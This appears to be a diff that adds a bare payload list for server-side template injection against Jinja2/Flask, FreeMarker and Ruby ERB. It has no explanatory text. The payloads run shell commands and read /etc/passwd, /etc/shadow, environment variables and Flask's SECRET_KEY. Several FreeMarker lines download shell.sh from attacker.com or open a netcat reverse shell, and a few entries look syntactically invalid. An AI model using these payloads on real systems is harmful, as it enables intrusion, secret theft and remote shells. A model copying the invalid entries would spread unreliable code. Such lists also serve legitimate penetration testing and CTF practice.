+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
+{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{[].__class__.__base__.__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{[].__class__.__base__.__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}
+{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.environ['werkzeug.server.shutdown']()}}
+{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
+{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
+{{url_for.__globals__['__builtins__']['exec']("__import__('os').popen('id').read()")}}
+{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{url_for.__globals__['current_app'].config['SECRET_KEY']}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].__import__('os').popen('id').read()}}{%endif%}{%endfor%}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='_wrap_close'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('ls -la',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('uname -a',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('pwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('env',shell=True,stdout=-1).communicate()[0].strip()}}
+{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f'))}
+{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%}
+{%print(cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%}
+{%set chr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__[chr(111)%2bchr(115)].popen('id').read()}}
+{%set chr=lipsum.__globals__.__builtins__.chr%}{%set cmd=chr(105)%2bchr(100)%}{{lipsum.__globals__.os.popen(cmd).read()}}
+{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{cycler|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{joiner|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{namespace|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("id")|attr("read")()}}
+{{request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("id")|attr("read")()}}
+{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(396)('id',shell=True,stdout=-1)|attr('communicate')()|attr('__getitem__')(0)|attr('strip')()}}
+{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
+{{self|attr('_TemplateReference__context')|attr('cycler')|attr('__init__')|attr('__globals__')|attr('os')|attr('popen')('id')|attr('read')()}}
+{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{lipsum['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()}}
+{{cycler['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()}}
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os').popen('id').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "Popen" in x.__name__ %}{{x('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}
+{%with a=request|attr("application")%}{%with b=a|attr("__globals__")%}{%with c=b|attr("__getitem__")%}{%with d=c("__builtins__")%}{%with e=d|attr("__getitem__")%}{%with f=e("__import__")%}{%with g=f("os")%}{%with h=g|attr("popen")%}{%with i=h("id")%}{%with j=i|attr("read")%}{{j()}}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}
+{%set x=lipsum|attr("\x5f\x5fglobals\x5f\x5f")%}{%set y=x|attr("\x5f\x5fgetitem\x5f\x5f")%}{%set z=y("os")%}{%set a=z|attr("popen")%}{%set b=a("id")%}{%set c=b|attr("read")%}{{c()}}
+{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+{{().__class__.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{"".__class__.__bases__[0].__subclasses__()[40]("/etc/passwd").read()}}
+{{"".__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{dict.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
+{{dict.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+{{dict.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{dict.__bases__[0].__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{dict.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{%print(''.__class__.__mro__[1].__subclasses__())%}
+{%print(lipsum.__globals__)%}
+{%print(cycler.__init__.__globals__)%}
+{%print(request.environ)%}
+{%print(config.items())%}
+{{x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
+{{lipsum.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
+{{lipsum.__globals__['__builtins__']['exec']('import os;os.popen("id").read()')}}
+{{lipsum.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
+{{lipsum.__globals__.__builtins__.exec('import os;print(os.popen("id").read())')}}
+{{cycler.__init__.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
+{{cycler.__init__.__globals__.__builtins__.exec('import os;print(os.popen("id").read())')}}
+{{joiner.__init__.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
+{{namespace.__init__.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}
+{%import os%}{{os.popen('id').read()}}
+{%import subprocess%}{{subprocess.check_output('id',shell=True)}}
+{%import pty%}{{pty.spawn('/bin/bash')}}
+{{''.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[230].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{request.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{self.__dict__._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{self.__dict__._TemplateReference__context.lipsum.__globals__.os.popen('id').read()}}
+{{self.__dict__._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}}
+{{self.__dict__._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}
+${7*7}
+${7*'7'}
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.Execute"?new()("whoami")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("ls -la")}
+${"freemarker.template.utility.Execute"?new()("uname -a")}
+${"freemarker.template.utility.Execute"?new()("pwd")}
+${"freemarker.template.utility.Execute"?new()("env")}
+${"freemarker.template.utility.Execute"?new()("cat flag.txt")}
+${"freemarker.template.utility.Execute"?new()("ps aux")}
+${"freemarker.template.utility.Execute"?new()("ifconfig")}
+${"freemarker.template.utility.Execute"?new()("netstat -an")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/shadow")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","whoami").start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/etc/passwd")}
+${"freemarker.template.utility.JythonRuntime"?new().exec("id")}
+${"freemarker.template.utility.JythonRuntime"?new().eval("1+1")}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -la") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("uname -a") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("pwd") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("env") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat flag.txt") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ps aux") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ifconfig") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("netstat -an") }
+<#assign classloader=object?class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
+${object.getClass()}
+${object.getClass().getClassLoader()}
+${object.getClass().getProtectionDomain()}
+${object.getClass().getProtectionDomain().getCodeSource()}
+${object.getClass().getProtectionDomain().getClassLoader()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.ProcessBuilder","id").start()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.ProcessBuilder","whoami").start()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.ProcessBuilder","cat","/etc/passwd").start()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.io.File","/etc/passwd").exists()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.io.File","/").list()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.io.File","/etc/passwd")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/etc/passwd").exists()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/").list()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/").listFiles()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["sh","-c","id"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["bash","-c","id"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["/bin/sh","-c","id"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["/bin/bash","-c","id"]).start()}
+<#assign command="id">
+${"freemarker.template.utility.Execute"?new()(command)}
+<#assign command="whoami">
+${"freemarker.template.utility.Execute"?new()(command)}
+<#assign command="cat /etc/passwd">
+${"freemarker.template.utility.Execute"?new()(command)}
+${.version}
+${.data_model}
+${.globals}
+${.locale}
+${.now}
+${.current_node}
+${.main}
+${.namespace}
+${.output_encoding}
+${.url_escaping_charset}
+${.vars}
+${.lang}
+<#assign uri=object?class.getResource("/").toURI()>
+<#assign input=uri?class.getConstructor(uri?class).newInstance(uri).toURL().openStream()>
+<#assign scanner=input?class.getModule().getClassLoader().loadClass("java.util.Scanner").getConstructor(input?class).newInstance(input).useDelimiter("\\A")>
+${scanner.next()}
+${"freemarker.template.utility.Execute"?new()("touch /tmp/pwned")}
+${"freemarker.template.utility.Execute"?new()("wget http://attacker.com/shell.sh -O /tmp/shell.sh")}
+${"freemarker.template.utility.Execute"?new()("curl http://attacker.com/shell.sh -o /tmp/shell.sh")}
+${"freemarker.template.utility.Execute"?new()("nc attacker.com 4444 -e /bin/bash")}
+<#assign classloader=object?class.protectionDomain.classLoader>
+<#assign clazz=classloader.loadClass("freemarker.template.utility.Execute")>
+<#assign obj=clazz?new()>
+${obj("id")}
+<#assign classloader=object?class.protectionDomain.classLoader>
+<#assign clazz=classloader.loadClass("java.lang.Runtime")>
+<#assign runtime=clazz.getRuntime()>
+${runtime.exec("id")}
+<#assign classloader=object?class.protectionDomain.classLoader>
+<#assign clazz=classloader.loadClass("java.lang.ProcessBuilder")>
+<#assign constructor=clazz.getConstructor(classloader.loadClass("[Ljava.lang.String;"))>
+<#assign process=constructor.newInstance(["id"])>
+${process.start()}
+${"freemarker.template.utility.Execute"?new()("cat${IFS}/etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("cat$IFS/etc/passwd")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["sh","-c","cat</etc/passwd"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["sh","-c","cat<flag.txt"]).start()}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("cat${IFS}/etc/passwd")}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("cat$IFS/etc/passwd")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("user.name")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("user.home")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("user.dir")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("os.name")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("os.version")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("java.version")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getProperty("java.home")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getenv()}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getenv("PATH")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getenv("HOME")}
+<#assign system=object?class.protectionDomain.classLoader.loadClass("java.lang.System")>
+${system.getenv("USER")}
+${"freemarker.template.utility.Execute"?new()("calc")}
+${"freemarker.template.utility.Execute"?new()("cmd /c calc")}
+${"freemarker.template.utility.Execute"?new()("cmd /c dir")}
+${"freemarker.template.utility.Execute"?new()("powershell.exe")}
+${"freemarker.template.utility.Execute"?new()("cmd.exe /c whoami")}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("cmd /c whoami")}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("powershell -c whoami")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["cmd","/c","whoami"]).start()}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["powershell","-c","whoami"]).start()}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.Runtime").getRuntime().exec("id")}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.Runtime").getRuntime().exec("whoami")}
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${value("java.lang.Runtime").getRuntime().exec("cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()(request.getParameter("cmd"))}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex(request.getParameter("cmd"))}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex(.data_model.cmd)}
+${"freemarker.template.utility.JythonRuntime"?new().exec("import os;os.system('id')")}
+${"freemarker.template.utility.JythonRuntime"?new().eval("__import__('os').system('id')")}
+<#assign jython="freemarker.template.utility.JythonRuntime"?new()>
+${jython.exec("import os;os.system('id')")}
+<#assign jython="freemarker.template.utility.JythonRuntime"?new()>
+${jython.eval("__import__('os').system('id')")}
+<#include "/etc/passwd">
+<#include "flag.txt">
+<#import "/etc/passwd" as passwd>
+<#setting url_escaping_charset="UTF-8">
+<#setting output_encoding="UTF-8">
+<%= 7*7 %>
+<%= 7*'7' %>
+<%= "foo" %>
+<%= system("id") %>
+<%= exec("id") %>
+<%= `id` %>
+<%= %x{id} %>
+<%= IO.popen("id").read %>
+<%= IO.read("/etc/passwd") %>
+<%= File.open("/etc/passwd").read %>
+<%= File.read("/etc/passwd") %>
+<%= File.open("/etc/passwd","r").read %>
+<%= File.open("flag.txt").read %>
+<%= File.read("flag.txt") %>
+<%= Dir.entries("/") %>
+<%= Dir.glob("*") %>
+<%= Dir.pwd %>
+<%= Dir.chdir("/tmp") %>
+<%= File.binread("/etc/passwd") %>
+<%= File.readlines("/etc/passwd") %>
+<%= File.foreach("/etc/passwd").read %>
+<%= IO.binread("/etc/passwd") %>
+<%= IO.readlines("/etc/passwd") %>
+<%= IO.foreach("/etc/passwd").read %>
+<%= system("cat /etc/passwd") %>
+<%= exec("cat /etc/passwd") %>
+<%= `cat /etc/passwd` %>
+<%= %x{cat /etc/passwd} %>
+<%= IO.popen("cat /etc/passwd").read %>
+<%= system("whoami") %>
+<%= `whoami` %>
+<%= %x{whoami} %>
+<%= IO.popen("whoami").read %>
+<%= system("ls -la") %>
+<%= `ls -la` %>
+<%= %x{ls -la} %>
+<%= IO.popen("ls -la").read %>
+<%= system("uname -a") %>
+<%= `uname -a` %>
+<%= %x{uname -a} %>
+<%= system("pwd") %>
+<%= system("env") %>
+<%= ENV %>
+<%= ENV.to_h %>
+<%= ENV["PATH"] %>
+<%= ENV["HOME"] %>
+<%= ENV["USER"] %>
+<%= ENV.keys %>
+<%= ENV.values %>
+<%= RUBY_VERSION %>
+<%= RUBY_PLATFORM %>
+<%= __FILE__ %>
+<%= __LINE__ %>
+<%= __dir__ %>
+<%= self %>
+<%= self.class %>
+<%= self.methods %>
+<%= self.instance_variables %>
+<%= ObjectSpace.each_object(Class).to_a %>
+<%= Kernel %>
+<%= Kernel.methods %>
+<%= Kernel.system("id") %>
+<%= Kernel.exec("id") %>
+<%= Kernel.`("id") %>
+<%= Kernel.spawn("id") %>
+<%= Kernel.open("|id").read %>
+<%= Kernel.eval("system('id')") %>
+<%= eval("system('id')") %>
+<%= eval("`id`") %>
+<%= eval("File.read('/etc/passwd')") %>
+<%= eval("IO.popen('id').read") %>
+<%= Kernel.eval("IO.popen('id').read") %>
+<%= method(:system).call("id") %>
+<%= method(:exec).call("id") %>
+<%= method(:eval).call("system('id')") %>
+<%= send(:system,"id") %>
+<%= send(:exec,"id") %>
+<%= send(:eval,"system('id')") %>
+<%= send("`","id") %>
+<%= public_send(:system,"id") %>
+<%= public_send(:eval,"system('id')") %>
+<%= __send__(:system,"id") %>
+<%= __send__(:eval,"system('id')") %>
+<%= Open3.capture2("id") %>
+<%= Open3.capture2e("id") %>
+<%= Open3.capture3("id") %>
+<%= Open3.popen3("id") %>
+<%= Gem::GemRunner.new.run(%w(install a)) %>
+<%= require 'open3'; Open3.capture2("id") %>
+<%= require 'open3'; Open3.capture2e("id") %>
+<%= require 'open3'; Open3.capture3("id") %>
+<%= require 'open-uri'; open('http://attacker.com').read %>
+<%= require 'net/http'; Net::HTTP.get(URI('http://attacker.com')) %>
+<%= system("cat flag.txt") %>
+<%= `cat flag.txt` %>
+<%= %x{cat flag.txt} %>
+<%= IO.popen("cat flag.txt").read %>
+<%= File.read("flag.txt") %>
+<%= system("ps aux") %>
+<%= `ps aux` %>
+<%= system("netstat -an") %>
+<%= `ifconfig` %>
+<%= system("cat /etc/shadow") %>
+<%= `cat /etc/shadow` %>
+<%= File.read("/etc/shadow") %>
+<%= open("|id").read %>
+<%= open("|cat /etc/passwd").read %>
+<%= open("|whoami").read %>
+<%= open("|ls -la").read %>
+<%= open("|uname -a").read %>
+<%= open("|pwd").read %>
+<%= open("|env").read %>
+<%= %x[id] %>
+<%= %x|id| %>
+<%= %x(id) %>
+<%= %x<id> %>
+<%= Kernel.%x(id) %>
+<%= Process.spawn("id") %>
+<%= Process.exec("id") %>
+<%= Process.daemon %>
+<%= spawn("id") %>
+<%= fork{system("id")} %>
+<%= IO.write("shell.rb","system('id')") %>
+<%= File.write("shell.rb","system('id')") %>
+<%= File.open("shell.rb","w").write("system('id')") %>
+<%= File.binwrite("shell.rb","system('id')") %>
+<%= "system('id')".instance_eval %>
+<%= "File.read('/etc/passwd')".instance_eval %>
+<%= self.instance_eval("system('id')") %>
+<%= self.class_eval("system('id')") %>
+<%= system("cat${IFS}/etc/passwd") %>
+<%= system("cat<flag.txt") %>
+<%= "\x73\x79\x73\x74\x65\x6d".to_sym.to_proc.call("id") %>
+<%= :system.to_proc.call("id") %>
+<%= :exec.to_proc.call("id") %>
+<%= :eval.to_proc.call("system('id')") %>
